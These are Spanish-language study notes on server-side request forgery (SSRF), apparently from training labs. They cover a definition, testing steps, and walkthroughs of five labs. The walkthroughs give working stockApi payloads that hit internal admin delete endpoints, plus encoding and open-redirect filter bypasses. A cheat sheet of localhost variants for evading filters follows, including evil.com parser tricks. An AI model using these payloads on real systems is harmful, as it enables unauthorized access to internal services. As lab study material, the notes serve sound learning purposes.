-----
### QUE ES?
Una **SSRF (Server-Side Request Forgery)** es una vulnerabilidad donde un atacante consigue que el **servidor** haga peticiones HTTP en su nombre.  
Ocurre cuando la aplicación acepta una URL como input y la solicita sin validarla correctamente.  
Permite acceder a recursos internos (como `localhost`, servicios en red interna o metadata cloud) que normalmente no son accesibles desde fuera.  
Se previene validando y filtrando las URLs, bloqueando direcciones internas y usando listas blancas de destinos permitidos.
#### PASOS: 
- *BUSCAR REQUEST A URLS*
- *PROBAR LOCALHOST Y SUS VARIANTES*
- *PROBAR A FUZZEAR IPS*
- *REVISAR REFERRER COMO EN LAB3*
- *PROBAR A ENCODEAR UNA O MAS VECES*
### LAB1: BASIC SSRF AGAINST THE LOCAL SERVER
En este lab observamos un apartado *Check Stock* que al interceptarlo con *Burp* vemos que esta tramitando una peticion a una *url*.
El exploit consiste en cambiar esa url por una al *localhost/admin*:
`stockApi=http://localhost/admin/delete?username=carlos&storeId=1`
### LAB2: BASIC SSRF AGAINST ANOTHER BACK-END SYSTEM
En este lab observamos un apartado *Check Stock* que al interceptarlo con *Burp* vemos que esta tramitando una peticion a una *url*.
En este caso la petición es a una ip en particular la cual debemos de fuzzear con el intruder para encontrarla:
`stockApi=http://192.168.0.&n&/admin/delete?username=carlos&storeId=1`
Vemos que hay una sola ip que responde con un *200* y:
`stockApi=http://192.168.0.113/admin/delete?username=carlos&storeId=1`
### LAB3: BLIND SSRF WITH OUT-OF-BAND DETECTION
En este lab si interceptamos la request de visitar un producto podemos ver que la web realiza busquedas a la *url* especificada en el *referrer*.
Para comprobarlo interceptamos la petición, click derecho en el referrer y insert collaborator payload, send de request.
Desde el collaborator hacemos pull now y podremos ver trazas *DNS* y *HTTP*
### LAB4: SSRF WITH BLACKLIST-BASED INPUT FILTER
En este lab observamos un apartado *Check Stock* que al interceptarlo con *Burp* vemos que esta tramitando una peticion a una *url* pero
hay una doble seguridad que podemos bypassear. Debemos probar con distintas formas de referenciar al localhost y ademas debemos url encodear varias veces
Al probar con `stockApi=http://127.1/` vemos que nos carga la raíz (también vale con localhost en decimal)
Ahora para acceder a `/admin` debemos seleccionar la *a* y darle a url encode all characters, dos veces.
`stockApi=http://127.1/%2561dmin`
### LAB5: SSRF WITH FILTER BYPASS VIA OPEN REDIRECTION VULNERABILITY
En este lab observamos un apartado *Check Stock* que al interceptarlo con *Burp* vemos que esta tramitando una peticion a una *url* .
Al probar con localhost no nos va a funcionar, tenemos que darnos cuenta de que hay un apartado next product que hace algo como: `/product/nextProduct?path=`
podemos intentar aprovechar esto para hacer: `stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos&storeId=1`

Probar rangos privados comunes.
## FORMAS DE REFERENCIAR LOCALHOST PARA BYPASS:
formas de referenciar localhost: 
 - `localhost` -> Nombre DNS que resuelve a loopback
- `localhost.` -> Dominio absoluto (el punto final importa)
- `localhost.localdomain` -> Alias habitual de loopback
- `127.0.0.1` -> IPv4 loopback clásica
- `127.1` -> Forma abreviada: 127.0.0.1
- `127.0.1` -> Faltan octetos, se rellenan con 0
- `127.0.0.1.` -> IP válida con punto final
- `2130706433` -> IP como entero decimal de 32 bits
- `0x7f000001` -> IP completa en hexadecimal
- `7f000001` -> Hexadecimal sin prefijo (si el parser lo permite)
- `017700000001` -> IP en octal
- `0177.1` -> Octal abreviado (0177 = 127)
- `127.0x0.0x0.0x1` -> Octetos en hexadecimal
- `127.000.000.001` -> Octetos en octal por ceros iniciales
- `127.0.0.256` -> Overflow de octeto (256 → 0/1 según parser)
- `0.0.0.0` -> Dirección comodín, a veces tratada como localhost
- `::1` -> Loopback en IPv6
- `0:0:0:0:0:0:0:1` -> IPv6 expandida
- `::ffff:127.0.0.1` -> IPv4 mapeada en IPv6
- `[::1]` -> IPv6 en formato URL
- `%6c%6f%63%61%6c%68%6f%73%74` -> `localhost` URL-encoded
- `%31%32%37%2e%30%2e%30%2e%31` -> `127.0.0.1` URL-encoded
- `ⅼocalhost` -> Homoglyph Unicode (parece localhost)
- `127.0.0.1.nip.io` -> DNS que resuelve al loopback
- `127.0.0.1.xip.io` -> Igual, resolución automática
- `localhost@127.0.0.1` -> Userinfo en URL confunde validadores
- `127.0.0.1@evil.com` -> El host real es evil.com (parser trick)
- `localhost#@evil.com` -> Todo tras `#` no se envía al servidor
- `http://127.1` -> Loopback usando forma abreviada en URL
- `http://[::ffff:127.0.0.1]` -> IPv6 con IPv4 embebida
- `http://2130706433` -> Loopback en decimal dentro de URL

## RANGOS PRIVADOS COMUNES:
- `10.0.0.1
- `10.0.0.2
- `192.168.0.1
- `192.168.1.1
- `172.16.0.1
